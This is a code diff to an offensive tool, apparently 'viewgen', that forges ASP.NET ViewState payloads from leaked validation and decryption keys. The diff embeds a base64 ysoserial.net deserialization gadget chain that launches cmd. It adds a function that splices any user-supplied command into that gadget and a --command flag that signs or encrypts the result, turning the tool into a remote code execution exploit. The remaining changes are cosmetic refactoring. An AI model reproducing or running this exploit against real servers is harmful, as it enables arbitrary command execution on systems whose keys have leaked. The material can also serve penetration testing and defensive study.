@@ -9,11 +9,20 @@ from viewstate import ViewState
 from xml.dom import minidom
 from colored import fg, attr
 
-import argparse, hashlib, hmac, base64, os, binascii, struct
+import argparse
+import hashlib
+import hmac
+import base64
+import os
+import binascii
+import struct
 
 
-pad = lambda s, bs : s + (bs - len(s) % bs) * chr(bs - len(s) % bs).encode("ascii")
-unpad = lambda s : s[:-ord(s[len(s)-1:])]
+# Generated with: https://github.com/pwntester/ysoserial.net
+YSOSERIAL_NET_SHELL_PAYLOAD = "/wEy7REAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAADy9jIHBpbmcgOC44LjguOAYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL"
+
+pad = lambda s, bs: s + (bs - len(s) % bs) * chr(bs - len(s) % bs).encode("ascii")
+unpad = lambda s: s[:-ord(s[len(s)-1:])]
 
 
 def success(s):
@@ -26,8 +35,8 @@ def warning(s):
 
 class ViewGen:
 	MD5_MODIFIER = b"\x00"*4
-	hash_algs = {"sha1": hashlib.sha1, "md5": hashlib.md5, "sha256": hashlib.sha256, "sha384": hashlib.sha384, "sha512": hashlib.sha512}
-	hash_sizes = {"sha1": 20, "md5": 16, "sha256": 32, "sha384": 48, "sha512": 64}
+	hash_algs = {"SHA1": hashlib.sha1, "MD5": hashlib.md5, "SHA256": hashlib.sha256, "SHA384": hashlib.sha384, "SHA512": hashlib.sha512}
+	hash_sizes = {"SHA1": 20, "MD5": 16, "SHA256": 32, "SHA384": 48, "SHA512": 64}
 
 	def __init__(self, validation_key=None, validation_alg=None, dec_key=None, dec_alg=None, modifier=None, encrypted=False):
 		self.validation_key = validation_key
@@ -128,7 +137,7 @@ class ViewGen:
 		data = base64.b64decode(payload)
 		enc, iv = self.encrypt(data)
 
-		if "md5" in self.validation_alg:
+		if "MD5" in self.validation_alg:
 			h = hashlib.md5(iv + enc + self.validation_key)
 		else:
 			hash_alg = self._get_hash_alg()
@@ -142,7 +151,7 @@ class ViewGen:
 	def sign(self, payload):
 		data = base64.b64decode(payload)
 
-		if "md5" in self.validation_alg:
+		if "MD5" in self.validation_alg:
 			h = hashlib.md5(data + self.validation_key + ViewGen.MD5_MODIFIER)
 		else:
 			hash_alg = self._get_hash_alg()
@@ -181,10 +190,9 @@ class ViewGen:
 				self.dec_alg = "DES"
 
 	def _init_validation_alg(self, validation_alg):
-		self.validation_alg = validation_alg.lower()
-		if self.validation_alg == "aes" or self.validation_alg == "3des":
-			self.validation_alg = "sha1"
-
+		self.validation_alg = validation_alg.upper()
+		if self.validation_alg == "AES" or self.validation_alg == "3DES":
+			self.validation_alg = "SHA1"
 
 	def _get_hash_size(self):
 		return self._search_dict(ViewGen.hash_sizes, self.validation_alg)
@@ -194,10 +202,16 @@ class ViewGen:
 
 	@staticmethod
 	def _search_dict(d, query):
-		l = [value for key, value in d.items() if query in key.lower()]
-		if not l:
+		items = [value for key, value in d.items() if query in key.upper()]
+		if not items:
 			return None
-		return l[0]
+		return items[0]
+
+
+def generate_shell_payload(command):
+	command = command[:0xff]
+	# TODO
+	return base64.b64encode(base64.b64decode(YSOSERIAL_NET_SHELL_PAYLOAD).replace(b"\x0f/c ping 8.8.8.8", bytes("%s%s%s" % (chr(len(command)+3), "/c ", command), "utf-8")))
 
 
 def read_webconfig(webconfig_path):
@@ -221,11 +235,12 @@ def read_webconfig(webconfig_path):
 
 def parse_args():
 	parser = argparse.ArgumentParser(description="viewgen is a ViewState tool capable of generating both signed and encrypted payloads with leaked validation keys or web.config files")
-	parser.add_argument("-c", "--webconfig", help="automatically load keys and algorithms from a web.config file", required=False)
-	parser.add_argument("-m", "--modifier", help="VIEWSTATEGENERATOR value", required=False, default="00000000")
+	parser.add_argument("--webconfig", help="automatically load keys and algorithms from a web.config file", required=False)
 	parser.add_argument("--decode", help="decode a ViewState payload", required=False, default=False, action="store_true")
 	parser.add_argument("--guess", help="guess signature and encryption mode for a given payload", required=False, default=False, action="store_true")
 	parser.add_argument("--check", help="check if modifier and keys are correct for a given payload", required=False, default=False, action="store_true")
+	parser.add_argument("-m", "--modifier", help="VIEWSTATEGENERATOR value", required=False, default="00000000")
+	parser.add_argument("-c", "--command", help="Command to execute", required=False)
 	parser.add_argument("--vkey", help="validation key", required=False, default="")
 	parser.add_argument("--valg", help="validation algorithm", required=False, default="")
 	parser.add_argument("--dkey", help="decryption key", required=False, default="")
@@ -287,7 +302,10 @@ def run_viewgen(args):
 				success("Signature algorithm: %s" % hash_alg.upper())
 
 	if generate:
-		result = viewgen.encode(args.payload)
+		if args.command is None:
+			result = viewgen.encode(args.payload)
+		else:
+			result = viewgen.encode(generate_shell_payload(args.command))
 		print(str(result, "utf-8"))
 
 
